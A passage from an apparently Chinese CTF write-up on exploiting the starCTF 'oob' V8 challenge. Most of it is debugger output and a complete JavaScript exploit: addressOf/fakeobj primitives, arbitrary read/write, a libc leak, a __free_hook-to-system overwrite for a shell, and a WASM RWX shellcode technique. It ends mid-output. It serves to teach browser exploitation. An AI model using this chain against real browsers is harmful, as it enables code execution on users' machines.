class="line">0x39ddc5310ed0:0x00002df35e640c710x000018405dc0aca1</span><br><span class="line">0x39ddc5310ee0:0x000039ddc53018690x000018405dc00699</span><br><span class="line">0x39ddc5310ef0:0x000011c169a06c010x00003fb2ce6c2d99</span><br><span class="line">0x39ddc5310f00:0x00002df35e6402710x0000000000080008</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x 0x39ddc5310ef0-0x39ddc5310ec0</span><br><span class="line">$1 = 0x30</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x11c169a06c01+0x40-1</span><br><span class="line">00:0000│   0x11c169a06c40 ◂— movabs r10, 0x7f5949700fa0</span><br><span class="line">01:0008│   0x11c169a06c48 ◂— add    byte ptr [rax], al</span><br><span class="line">02:0010│   0x11c169a06c50 ◂— add    byte ptr [rax], al</span><br><span class="line">... ↓</span><br><span class="line">04:0020│   0x11c169a06c60 —▸ 0x2df35e640a31 ◂— 0x2df35e6401</span><br><span class="line">05:0028│   0x11c169a06c68 —▸ 0x2df35e642c01 ◂— 0x2df35e6407</span><br><span class="line">06:0030│   0x11c169a06c70 —▸ 0x2df35e640c71 ◂— 0x2df35e6408</span><br><span class="line">07:0038│   0x11c169a06c78 —▸ 0x2df35e642791 ◂— 0x2df35e6407</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap 0x7f5949700fa0</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7f5948274000     0x7f5949d8a000 r-xp  1b16000 136c000 /home/focu5/chromium/v8/out.gn/x64.debug/libv8.so +0x148cfa0</span><br></pre></td></tr></table></figure><p>在<code>release</code>版本下，则会泄露出 <code>d8</code>的地址</p><h4 id="本地shell"><a href="#本地shell" class="headerlink" title="本地shell"></a>本地shell</h4><p>有了<code>libc</code>剩下就可以和常规<code>pwn</code>一样了，有任意地址写，直接写<code>free_hook</code>就好。</p><p>在调试的时候发现写0x7f…这样的地址写不上去，看<a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/">e3pem师傅的博客</a>发现另一种写法</p><blockquote><p>这里有另外一种方式来解决这个问题，DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>，修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var data_buf &#x3D; new ArrayBuffer(8);</span><br><span class="line">var data_view &#x3D; new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr &#x3D; addressOf(data_buf) + 0x20n;</span><br><span class="line">function writeDataview(addr,data)&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(0, data, true);</span><br><span class="line">    console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatArrayMap,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeobj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get shell</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> d8_addr = read64(code_addr + <span class="number">0x41n</span>) - <span class="number">0x8424e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc d8_addr: 0x&quot;</span> + hex(d8_addr));</span><br><span class="line">got_printf = d8_addr + <span class="number">0xb073c8n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] got_printf: 0x&quot;</span> + hex(got_printf));</span><br><span class="line">libc_base = read64(got_printf)- <span class="number">0x64f00n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc: 0x&quot;</span> + hex(libc_base));</span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8n</span>;</span><br><span class="line">system = libc_base + <span class="number">0x4f4e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] free_hook: 0x&quot;</span> + hex(free_hook));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] system: 0x&quot;</span> + hex(system));</span><br><span class="line">writeDataview(free_hook, system)</span><br><span class="line"><span class="keyword">var</span> shell_str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;/bin/sh\0&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure><h4 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h4><blockquote><p><strong>WebAssembly</strong>或称<strong>wasm</strong>是一个实验性的<a href="https://zh.wikipedia.org/wiki/%E4%BD%8E%E7%BA%A7%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80">低级编程语言</a>，应用于<a href="https://zh.wikipedia.org/wiki/%E7%80%8F%E8%A6%BD%E5%99%A8">浏览器</a>内的<a href="https://zh.wikipedia.org/wiki/%E5%AE%A2%E6%88%B6%E7%AB%AF">客户端</a>。WebAssembly是便携式的<a href="https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E8%AA%9E%E6%B3%95%E6%A8%B9">抽象语法树</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-1">1]</a>，被设计来提供比<a href="https://zh.wikipedia.org/wiki/JavaScript">JavaScript</a>更快速的<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E8%AF%91">编译</a>及运行[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-github.com-2">2]</a>。WebAssembly将让开发者能运用自己熟悉的编程语言（最初以<a href="https://zh.wikipedia.org/wiki/C%E8%AA%9E%E8%A8%80">C</a>/<a href="https://zh.wikipedia.org/wiki/C%2B%2B">C++</a>作为实现目标）编译，再藉虚拟机引擎在浏览器内运行[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-3">3]</a>。WebAssembly的开发团队分别来自<a href="https://zh.wikipedia.org/wiki/Mozilla%E5%9F%BA%E9%87%91%E6%9C%83">Mozilla</a>、<a href="https://zh.wikipedia.org/wiki/Google">Google</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E8%BB%9F">Microsoft</a>、<a href="https://zh.wikipedia.org/wiki/%E8%98%8B%E6%9E%9C%E5%85%AC%E5%8F%B8">Apple</a>，代表着四大网络浏览器<a href="https://zh.wikipedia.org/wiki/Firefox">Firefox</a>、<a href="https://zh.wikipedia.org/wiki/Google_Chrome">Chrome</a>、<a href="https://zh.wikipedia.org/wiki/Microsoft_Edge">Microsoft Edge</a>、<a href="https://zh.wikipedia.org/wiki/Safari">Safari</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-4">4]</a>。2017年11月，以上四个浏览器都开始实验性的支持WebAssembly[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-5">5]</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-6">6]</a>。WebAssembly 于 2019 年 12 月 5 日成为万维网联盟（W3C）的推荐，与 HTML，CSS 和 JavaScript 一起，成为 Web 的第四种语言。[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-7">7]</a>。</p></blockquote><p><a href="https://wasdk.github.io/WasmFiddle/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%BA%BF%E5%B0%86C%E8%AF%AD%E8%A8%80%E7%9B%B4%E6%8E%A5%E8%BD%AC%E6%8D%A2%E4%B8%BAwasm%E5%B9%B6%E7%94%9F%E6%88%90JS%E9%85%8D%E5%A5%97%E8%B0%83%E7%94%A8%E4%BB%A3%E7%A0%81%E3%80%82">https://wasdk.github.io/WasmFiddle/，这个网站可以在线将C语言直接转换为wasm并生成JS配套调用代码。</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> d = f();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] return from wasm: &quot;</span> + d);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/v8/out.gn/x64.debug$ ./d8 --allow-natives-syntax ./test.js</span></span><br><span class="line"><span class="comment">[*] return from wasm: 42</span></span><br><span class="line"><span class="comment">Trace/breakpoint trap (core dumped)*/</span></span><br></pre></td></tr></table></figure><p>在<code>js</code>代码中加入<code>wasm</code>之后，程序中会存在一个<code>rwx</code>的段，我们可以把<code>shellcode</code>放到这个段里面，再跳过去执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*利用job命令查看函数结构对象，经过Function--&gt;shared_info--&gt;WasmExportedFunctionData--&gt;instance等一系列调用关系，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">DebugPrint: 0x59fa561fab9: [Function] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3e43f7c44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x059fa5602109 &lt;JSFunction (sfi = 0xa1f9e548039)&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x1de519340c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - function prototype: &lt;no-prototype-slot&gt;</span></span><br><span class="line"><span class="comment"> - shared_info: 0x059fa561fa81 &lt;SharedFunctionInfo 0&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x1de519344ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - context: 0x059fa5601869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - code: 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - WASM instance 0x59fa561f8c1</span></span><br><span class="line"><span class="comment"> - WASM function index 0</span></span><br><span class="line"><span class="comment"> - properties: 0x1de519340c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x0a1f9e5404b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #name: 0x0a1f9e540449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #arguments: 0x0a1f9e540369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #caller: 0x0a1f9e5403d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561fa81</span></span><br><span class="line"><span class="comment">0x59fa561fa81: [SharedFunctionInfo] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x1de5193409e1 &lt;Map[56]&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x1de519344ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - function_map_index: 144</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - expected_nof_properties: 0</span></span><br><span class="line"><span class="comment"> - language_mode: sloppy</span></span><br><span class="line"><span class="comment"> - data: 0x059fa561fa59 &lt;WasmExportedFunctionData&gt;</span></span><br><span class="line"><span class="comment"> - code (from data): 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - function token position: -1</span></span><br><span class="line"><span class="comment"> - start position: -1</span></span><br><span class="line"><span class="comment"> - end position: -1</span></span><br><span class="line"><span class="comment"> - no debug info</span></span><br><span class="line"><span class="comment"> - scope info: 0x1de519340c61 &lt;ScopeInfo[0]&gt;</span></span><br><span class="line"><span class="comment"> - length: 0</span></span><br><span class="line"><span class="comment"> - feedback_metadata: 0x1de519342a39: [FeedbackMetadata]</span></span><br><span class="line"><span class="comment"> - map: 0x1de519341319 &lt;Map&gt;</span></span><br><span class="line"><span class="comment"> - slot_count: 0</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561fa59</span></span><br><span class="line"><span class="comment">0x59fa561fa59: [WasmExportedFunctionData] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x1de519345879 &lt;Map[40]&gt;</span></span><br><span class="line"><span class="comment"> - wrapper_code: 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - instance: 0x059fa561f8c1 &lt;Instance map = 0x3e43f7c49789&gt;</span></span><br><span class="line"><span class="comment"> - function_index: 0</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561f8c1</span></span><br><span class="line"><span class="comment">0x59fa561f8c1: [WasmInstanceObject] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3e43f7c49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x2aeb9878ac19 &lt;Object map = 0x3e43f7c4abd9&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x1de519340c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - module_object: 0x2aeb9878e411 &lt;Module map = 0x3e43f7c491e9&gt;</span></span><br><span class="line"><span class="comment"> - exports_object: 0x2aeb9878e681 &lt;Object map = 0x3e43f7c4ad19&gt;</span></span><br><span class="line"><span class="comment"> - native_context: 0x059fa5601869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - memory_object: 0x059fa561f9e9 &lt;Memory map = 0x3e43f7c4a189&gt;</span></span><br><span class="line"><span class="comment"> - table 0: 0x2aeb9878e619 &lt;Table map = 